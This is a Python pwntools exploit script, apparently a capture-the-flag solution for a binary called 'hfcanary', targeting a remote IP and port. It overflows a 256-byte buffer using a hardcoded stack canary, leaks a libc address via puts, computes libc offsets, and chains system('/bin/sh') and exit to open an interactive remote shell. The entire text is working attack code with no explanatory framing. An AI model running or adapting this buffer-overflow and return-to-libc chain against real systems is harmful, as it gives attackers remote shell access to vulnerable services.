#!/usr/bin/python
from pwn import *
from bf_hfcanary import *

debug = False

if debug:
	r = process('./hfcanary_share')
	offset___libc_start_main = 0x00018d90
	offset_system = 0x0003cd10
	offset_str_bin_sh = 0x17b988
	offset_exit = 0x000300d0
else:
	r = remote('202.125.94.131', 5010)
	offset___libc_start_main = 0x19420
	offset_system = 0x03eed0
	offset_str_bin_sh = 0x16026c
	offset_exit = 0x032b70

memset_addr = 0x0804a024

puts_plt = 0x080483e0
libc_start_got = 0x804a020
main_addr = 0x080485cd

#canary = int(bruteforce_canary(), 16)
canary = 0xfacec0de
log.info('canary : 0x%x' % canary)

p = 'a' * 256 + p32(canary) + 'a' * 8

pad = p

p += p32(puts_plt)
p += p32(main_addr)
p += p32(libc_start_got)

r.sendline(p)
r.recvuntil('Thank you for your suggestion\n')

libc_start_main = u32(r.recv(4))

log.info('libc_start_main: 0x%x' % libc_start_main)

libc_base = libc_start_main - offset___libc_start_main
system_addr = libc_base + offset_system
exit_addr = libc_base + offset_exit
binsh_addr = libc_base + offset_str_bin_sh

log.info('libc_base: 0x%x' % libc_base)
log.info('system_addr: 0x%x' % system_addr)
log.info('exit_addr: 0x%x' % exit_addr)
log.info('binsh_addr: 0x%x' % binsh_addr)

q = pad

q += p32(system_addr)
q += p32(exit_addr)
q += p32(binsh_addr)

r.sendline(q)
r.recvuntil('Thank you for your suggestion\n')
r.interactive()
